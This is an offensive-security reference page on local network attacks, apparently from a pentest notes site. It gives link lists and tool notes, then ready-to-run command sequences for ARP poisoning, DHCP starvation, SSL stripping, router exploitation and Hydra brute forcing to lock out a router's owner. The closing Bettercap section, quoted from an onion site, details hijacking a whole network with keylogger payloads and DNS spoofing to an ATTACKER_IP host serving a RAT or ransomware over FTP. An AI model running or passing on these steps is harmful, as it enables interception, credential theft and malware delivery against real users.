# Network Attacks /Harvesting/MITM

## Guides and Reference

* [https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks](https://book.hacktricks.xyz/pentesting/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks)
* [https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/](https://www.blackhillsinfosec.com/how-to-disable-llmnr-why-you-want-to/)
* [https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/](https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/)
* [https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them](https://www.alteredsecurity.com/post/fantastic-windows-logon-types-and-where-to-find-credentials-in-them)
* [https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/](https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning/)
* [https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/](https://pentest.blog/what-is-llmnr-wpad-and-how-to-abuse-them-during-pentest/)
* [https://github.com/frostbits-security/MITM-cheatsheet](https://github.com/frostbits-security/MITM-cheatsheet)

### NTLM Relay & LLMNR/NBNS

* [Pwning with Responder – A Pentester’s Guide](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)
* [Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes)](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html)
* [Relaying credentials everywhere with ntlmrelayx](https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
* [Combining NTLM Relaying and Kerberos delegation](https://chryzsh.github.io/relaying-delegation/)
* [mitm6 – compromising IPv4 networks via IPv6](https://www.fox-it.com/en/news/blog/mitm6-compromising-ipv4-networks-via-ipv6/)
* [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)

## Tools

* [Responder ](https://github.com/lgandx/Responder)**-** ​LLMNR/NBT-NS/mDNS Poisoner.
  * MultiRelay.py - Tool within the Responder pack to perform NTLM Relay attacks.
  * [https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/](https://www.4armed.com/blog/llmnr-nbtns-poisoning-using-responder/)
  * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/ntlm\_relaying\_and\_theft/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/active\_directory\_privilege\_escalation/ntlm\_relaying\_and\_theft/)
  * [https://trelis24.github.io/2018/08/03/Windows-WPAD-Poisoning-Responder/](https://trelis24.github.io/2018/08/03/Windows-WPAD-Poisoning-Responder/)
  * _Operator Handbook: Responder - pg. 265_
* [mitm6](https://github.com/fox-it/mitm6) - mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. It does this by replying to DHCPv6 messages, providing victims with a link-local IPv6 address and setting the attackers host as default DNS server.
* [Flamingo](https://github.com/atredispartners/flamingo) - ​Captures credentials sprayed across the network by various IT and security products.
  * ​[https://www.atredis.com/blog/2020/1/26/flamingo-captures-credentials](https://www.atredis.com/blog/2020/1/26/flamingo-captures-credentials)_​_
  * _Operator Handbook: Flamingo - pg. 65_
* [BetterCap](https://github.com/bettercap/bettercap) - ​Bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an **easy to use**, **all-in-one solution** with all the features they might possibly need for performing reconnaissance and attacking [WiFi](https://www.bettercap.org/modules/wifi/) networks, [Bluetooth Low Energy](https://www.bettercap.org/modules/ble/) devices, wireless [HID](https://www.bettercap.org/modules/hid/) devices and [Ethernet](https://www.bettercap.org/modules/ethernet) networks.
  * [https://www.bettercap.org/](https://www.bettercap.org)
* [Inveigh](https://github.com/Kevin-Robertson/Inveigh) - ​Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers.
  * Can be used similarly to Responder and MultiRelay
* [Espionage](https://github.com/DoubleThreatSecurity/Espionage) - ​Espionage is a network packet sniffer that intercepts large amounts of data being passed through an interface. The tool allows users to to run normal and verbose traffic analysis that shows a live feed of traffic, revealing packet direction, protocols, flags, etc.
* [BruteShark](https://github.com/odedshimon/BruteShark) - BruteShark is a Network Forensic Analysis Tool (NFAT) that performs deep processing and inspection of network traffic (mainly PCAP files, but it also capable of directly live capturing from a network interface). It includes: password extracting, building a network map, reconstruct TCP sessions, extract hashes of encrypted passwords and even convert them to a Hashcat format in order to perform an offline Brute Force attack.
* [Yersina](https://github.com/tomac/yersinia) - ​A framework for layer 2 attacks
* [StreamDivert](https://github.com/jellever/StreamDivert) - Redirecting (specific) TCP, UDP and ICMP traffic to another destination.
* [PortBender](https://github.com/praetorian-inc/PortBender) - PortBender is a TCP port redirection utility that allows a red team operator to redirect inbound traffic destined for one TCP port (e.g., 445/TCP) to another TCP port (e.g., 8445/TCP).
* Impacket Scripts
  * [ntlmrelayx.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/ntlmrelayx.py) This script performs NTLM Relay Attacks, setting an SMB and HTTP Server and relaying credentials to many different protocols (SMB, HTTP, MSSQL, LDAP, IMAP, POP3, etc.). The script can be used with predefined attacks that can be triggered when a connection is relayed (e.g. create a user through LDAP) or can be executed in SOCKS mode. In this mode, for every connection relayed, it will be available to be used later on multiple times through a SOCKS proxy.
  * [karmaSMB.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/karmaSMB.py) A SMB Server that answers specific file contents regardless of the SMB share and pathname specified.
  * [smbserver.py:](https://github.com/SecureAuthCorp/impacket/blob/impacket\_0\_9\_21/examples/smbserver.py) A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.
* [LDAP-Password-Hunter](https://github.com/oldboy21/LDAP-Password-Hunter) - a tool which wraps features of getTGT.py (Impacket) and ldapsearch in order to look up for password stored in LDAP database.
* NTLM Relay
  * [Divert](https://github.com/basil00/Divert) - WinDivert: Windows Packet Divert
  * [DivertTCPconn](https://github.com/Arno0x/DivertTCPconn) - A TCP packet diverter for Windows platform
  * [https://rastamouse.me/ntlm-relaying-via-cobalt-strike/](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)

## Network Level Attacks

[https://book.hacktricks.xyz/pentesting/pentesting-network#lan-attacks](https://book.hacktricks.xyz/pentesting/pentesting-network#lan-attacks)d

### **ARP based Attacks**

* ARP cache poisoning&#x20;
  * First you must set up IP forwarding to forward any extraneous packets received to their proper destination&#x20;
    * \# echo 1 > /proc/sys/net/ipv4/ip\_forward&#x20;
  * Display your machine's current ARP cache&#x20;
    * \# arp -a&#x20;
  * Use the arpspoof command to masquerade as another IP&#x20;
    * \#arpspoof -i eth0 -t \[target IP] \[IP to spoof as]&#x20;
  * To set up an ARP MITM you will need to set it up in both directions&#x20;
    * \#arpspoof -i eth0 -t \[IP1] \[IP2]&#x20;
    * \#arpspoof -i eth0 -t \[IP2] \[IP1]&#x20;
  * You can set one of the IPs as your default gateway then start wireshark to capture all traffic a target creates going outbound&#x20;
* Attacks after ARP Spoofing&#x20;
  * Sidejacking - Sniffing session tokens and using them to auth the user&#x20;
    * Use Firesheep&#x20;
    * Hampster/Ferret - acts as a proxy server and replaces you cookies with session cookies stolen from someone else

### **DHCP Starvation**

* ****[**dhcpig**](https://www.kali.org/tools/dhcpig/) **-** DHCPig initiates an advanced DHCP exhaustion attack. It will consume all IPs on the LAN, stop new users from obtaining IPs, release any IPs in use, then for good measure send gratuitous ARP and knock all windows hosts offline.

```
# pig.py eth0
```

### **SSL Attacks**

* SSL MITM&#x20;
  * For an SSL MITM attack we will be using the tool ettercap&#x20;
  * Ettercap can also be used for an ARP or DNS MITM as well&#x20;
  * First we will start an ARP cache poisoning attack between the target and the gateway&#x20;
    * \#ettercap -Ti eth0 -M arp:remote /\[ip1]/ /\[ip2]/&#x20;
  * This will prompt a certificate error when people navigate to a website
* SSL stripping attack&#x20;
  * We MITM the http connection before its redirected to SSL and add SLL functionality before sending the packets to the web server&#x20;
  * When the server replies, ssl stripping intercepts the https tags before sending the packets to the through SSLstrip.&#x20;
  * We will run SSLstrip on port 8080, then restart arpspoof and spoof the default gateway.&#x20;
  * ◇ # iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080&#x20;
* Now we start SSLstrip on the outgoing port.&#x20;
  * \#sslstrip -l 8080

### **Packet Manipulation**

* [Scapy](https://github.com/secdev/scapy) -powerful Python library that allows full packet manipulation. It is a particularly useful tool to use when Nmap is unavailable or when less noise on the wire is needed.
* Create an IP packet with the destination field set to our target host:
  * `IP(dst=0.0.0.0)`
* &#x20;This can then be amended as follows to create an ICMP packet:
  * `test_packet = IP(dst="0.0.0.0")/ICMP()`
* The sr1() function will then send the packet on the wire:
  * `sr1(test_packet)`\</

{% embed url="https://youtu.be/LvaII2PEwcQ" %}

### **Router Based Attacks**

* Router Sploit - [https://www.github.com/threat9/routersploit ](https://www.github.com/threat9/routersploit)&#x20;
* Download and install Routersploit - a framework for exploiting routers.
  * \#git clone https://www.github.com/threat9/routersploit
  * \#cd routersploit
  * \#python3 -m pip install -r requirements.txt
  * \#python3 rsf.py
* Running Routersploit
  * \# python3 rsf.py
  * rsf> use scanners/autopwn
  * rsf> show options
  * rsf> set target \[router ip]
  * run
* Brute forcing the router admin interface
  * For when defaults dont work and you really need it.
  * Uses
    * Enable port forwarding
    * Change router DNS settings
    * Change password and lockout owner
  * First find a username, attempt what ever the defautl username is
  * Next use basic wordlists to attempt a crack
  * Process
    * Use Burp Suite to capture HTTP proxy request via Firefox
    * Use the repeater tool or Hydra to brute force attempt the password
      * Be aware, the burpsuite free version throttles the amount of requests you are able to perform
    * Hydra
      * hydra 192.168.0.1 http-post-form "/goform/formLogin:login=^USER^\&pass=^PASS^:F=User Name or Password is incorrect." -l admin -P pass.txt -vV -f
      * Breaking down the syntax is as follows:
        * http-post-form tells Hydra you're targeting a web login form HTTP POST data.
        * /goform/formLogin is the path we need to tell Hydra where the login page is.
        * login=^USER^\&pass=^PASS^ is the POST data we catpured from Burp Suite but we replaced "admin" and "PASSWORD" with "^USER^" and "^PASS^" in order to tell Hydra where the username and password fields are. This way Hydra knows what to brute force.
        * F=User Name or Password is incorrect tells Hydra what is displayed when failed credentials are entered.
      * _The failed login comments are good for Hydra to determine success and failure._
      * \-l admin states that you're using "admin" as the username.
      * \-P pass.txt is the password file with passwords in it line by line.
      * \-f tells Hydra to stop once it finds a successful match.
      * \-vV to be verbose and show the attempts.

{% embed url="https://youtu.be/wyjM_P7Axa8" %}

See the Special Targets section for more tools on attacking Cisco Devices

{% content-ref url="special-targets.md" %}
[special-targets.md](special-targets.md)
{% endcontent-ref %}

## MITM Methodology

### **MITM concepts**

* Most MITM programs use SSLStrip/SSLstrip+ to intercept HTTPS data by "downgrading" them to HTTP.
* &#x20;SSLStrip+ will work against TLS and SSL if HSTS is not used.
* &#x20;SSLStrip+ will work on anything that does not have HSTS preloaded.
* &#x20;SSLStrip+ will only work on non-preloaded HSTS websites.
* &#x20;We can intercept HTTPS non-HSTS websites but users are presented with multiple warnings before visiting the desired website.
* &#x20;We cannot MITM anything HSTS related (FaceBook, Twitter, IG, etc.).
* For best results
  * An attacker computer running Kali directly from USB or as the host OS.
  * A separate computer to be the target (Windows or MacOS preferably).
  * Attacker and Target computer/laptops connected to the same home network as you with internet connectivity.
  * Restart Kali after each tool example.

### **Bettercap**

* Intercepting HTTP traffic over the network with Bettercap&#x20;
  * In Kali open up a new Terminal window and type the following:&#x20;
    * **#**sudo bettercap&#x20;
  * All of the following commands below are to be entered into the bettercap window.&#x20;
    * \#net.probe on&#x20;
    * Wait 30 seconds for it to discover network hosts.&#x20;
    * \#net.probe off&#x20;
    * \#net.show&#x20;
      * This will show you the targets on the network. Pay attention to your target IP.&#x20;
    * set http.proxy.sslstrip true&#x20;
    * set net.sniff.verbose false&#x20;
    * set arp.spoof.targets TARGET\_IP&#x20;
    * My example:&#x20;
      * set arp.spoof.targets 192.168.2.100&#x20;
      * net.sniff on&#x20;
      * http.proxy on&#x20;
      * arp.spoof on&#x20;
* Intercepting HTTPS traffic over the network with Bettercap&#x20;
  * In Kali open up a new terminal window and type the following:&#x20;
    * \#sudo bettercap&#x20;
  * All the following commands below are to be entered into the bettercap window.&#x20;
  * net.probe on&#x20;
  * Wait 30 seconds for it to discover network hosts.&#x20;
  * net.probe off&#x20;
  * net.show&#x20;
  * This will show you the targets on the network. Pay attention to your target IP.&#x20;
  * set https.proxy.sslstrip true&#x20;
  * set net.sniff.verbose false&#x20;
  * set arp.spoof.targets TARGET\_IP&#x20;
  * My example:&#x20;
    * set arp.spoof.targets 192.168.2.100&#x20;
    * set arp.spoof.internal true&#x20;
    * net.sniff on&#x20;
    * https.proxy on&#x20;
    * arp.spoof on&#x20;
* Re-directing HTTP requests to your webserver over the network with Bettercap&#x20;
  * In Kali open up a new Terminal window and type the following:&#x20;
    * \#sudo service apache2 restart&#x20;
    * \#sudo bettercap&#x20;
  * All the following commands below are to be entered into the bettercap window.&#x20;
    * net.probe on&#x20;
    * Wait 30 seconds for it to discover network hosts.&#x20;
    * net.probe off&#x20;
    * net.show&#x20;
    * This will show you the targets on the network. Pay attention to your target IP. ◇ set http.proxy.sslstrip true&#x20;
    * set net.sniff.verbose false&#x20;
    * set arp.spoof.targets TARGET\_IP&#x20;
    * My example:&#x20;
      * set arp.spoof.targets 192.168.2.100&#x20;
      * set dns.spoof.domains __&#x20;
      * set dns.spoof.address ATTACKER\_IP&#x20;
    * My example:&#x20;
      * set dns.spoof.address 192.168.2.233&#x20;
      * set dns.spoof.all true&#x20;
      * net.sniff on&#x20;
      * http.proxy on&#x20;
      * arp.spoof on&#x20;
      * dns.spoof on&#x20;
* Re-directing HTTPS requests to your webserver over the network with Bettercap&#x20;
  * In Kali open up a new terminal window and type the following:&#x20;
    * \#sudo service apache2 restart&#x20;
    * \#sudo bettercap&#x20;
  * All the following commands below are to be entered into the bettercap window.&#x20;
    * net.probe on&#x20;
    * Wait 30 seconds for it to discover network hosts.&#x20;
    * net.probe off&#x20;
    * net.show&#x20;
    * This will show you the targets on the network. Pay attention to your target IP.&#x20;
    * set https.proxy.sslstrip true&#x20;
    * set net.sniff.verbose false&#x20;
    * set arp.spoof.targets TARGET\_IP&#x20;
  * My example:
    * set arp.spoof.targets 192.168.2.100&#x20;
    * set dns.spoof.domains __&#x20;
    * set dns.spoof.address ATTACKER\_IP&#x20;
  * My example:&#x20;
    * set dns.spoof.address 192.168.2.233&#x20;
    * set dns.spoof.all true&#x20;
    * net.sniff on&#x20;
    * https.proxy on&#x20;
    * arp.spoof on&#x20;
    * dns.spoof on

### Bettercap Master Attack

Quoted directly from [http://hacktownpagdenbb.onion/Links2/Chapter-11.html](http://hacktownpagdenbb.onion/Links2/Chapter-11.html)\
\
Easy FTP server\
• In Kali open up a new Terminal window and type the following:\
• git clone https://github.com/byt3bl33d3r/MITMf.git\
• sudo cp \~/MITMf/config/captive/portal.html /var/www/html/index.html\
• pip3 install pyftpdlib\
\
Bettercap has these things called "caplets" which come preinstalled that are modules that you're able to load to get a certain task done. We're going to use a bettercap caplet along with a combination of another\
\
For this example:\
My attacker computer IP is 192.168.2.233\
My target computer IP is 192.168.2.100\
\
In Kali open up a new Terminal window and type the following:\
&#x20;sudo service apache2 restart\
&#x20;sudo bettercap\
All the following commands below are to be entered into the bettercap window.\
net.probe on\
Wait 30 seconds for it to discover network hosts.\
net.probe off\
&#x20;net.show\
This will show you the targets on the network. Pay attention for your targets IP.\
set arp.spoof.targets TARGET\_IP\
My example:\
set arp.spoof.targets 192.168.2.100\
To attack the whole network:\
set arp.spoof.targets \*\
set arp.spoof.internal true\
&#x20;set dns.spoof.address ATTACKER\_IP\
My example:\
set dns.spoof.address 192.168.2.233\
set hstshijack.log /usr/share/bettercap/caplets/hstshijack/ssl.log\
&#x20;set hstshijack.ignore \*\
&#x20;set hstshijack.targets \*.cn,\*.org, www.\*, \*.com, \*.net\
&#x20;set hstshijack.replacements \*.ce, \*.orq, wvvw.\*,\*.corn,\*.nel\
&#x20;set hstshijack.obfuscate false\
&#x20;set hstshijack.encode true\
\
&#x20;set hstshijack.payloads \*:/usr/share/bettercap/caplets/hstshijack/payloads/sslstrip.pws,\*:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.pws,\*.google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.pws,google.com:/usr/share/bettercap/caplets/hstshijack/payloads/google.pws\
The above command "set hstshijack.payloads ..." is all one line so please copy and paste it.\
&#x20;http.proxy on\
&#x20;arp.spoof on\
&#x20;dns.spoof on\
Leave the bettercap window running.\
\
This attack will completely break the web browser and not allow the target to visit any HTTPS or HTTP website. Any web requests will be re-routed to our attacker page. If they type anything into the URL bar in Google Chrome when running this attack Chrome will recommend the HTTP version of what they're looking for and "help" the victim navigate to our web attack page which is great for us!\
\
In order to deliver your malware in the future you would need to edit /var/www/html/index.html to reflect your own file. Remember, in this chapter we copied the \~/MITMf/config/captive/portal.html to /var/www/html/index.html.\
\
For my example my malware will be called "DANGER.exe" and the file is located in "/var/www/html" which is the default Apache2 web server directory. If you had a RAT you would need to put the file into the "/var/www/html" directory and adjust the filename in /var/www/html/index.html to reflect your own RAT executable name. Obviously!\
\
&#x20;We're going to navigate to /var/www/html and run a FTP server delivering the contents of that directory and we're going to alter /var/www/html/index.html to reflect our executable name. This will allow the target to download our malware over FTP since we're re-directing everything web related on the network.\
\
In Kali open up a new Terminal window and type the following:\
cd /var/www/html\
&#x20;python3 -m pyftpdlib -w\
This will run a FTP server on port 2121. Leave this window running.\
\
If you're familiar with python the above command "python3 -m pyftpdlib -w" is the "python -m SimpleHTTPServer 80" equivalent but for FTP. In a nut shell it's a super easy way of bringing up a FTP server without config files and shit. You can script all this shit so it's automatic depending on your coding levels. Basic shit commander Cobra.\
\
\
In Kali open up a new Terminal window and type the following:\
sudo leafpad /var/www/html/index.html\
Change "CaptiveClient.exe" to "ftp://ATTACKER\_IP:2121/YOUR\_FILE.exe"\
My Example:\
[ftp://192.168.2.233:2121/DANGER.exe](ftp://192.168.2.233:2121/DANGER.exe)\
\
\
Save the file and close it.\
\
Now that we have the /var/www/html/index.html file configured (you would need to replace DANGER.exe with your RAT filename. This should be obvious!) the attack is ready. In the future you'd want to run the FTP server before using bettercap.\
\
This attack will break all HTTPS and HTTP websites the victim is trying to browse and will re-direct them to your web server with your malware/ransomware waiting to be downloaded over FTP.
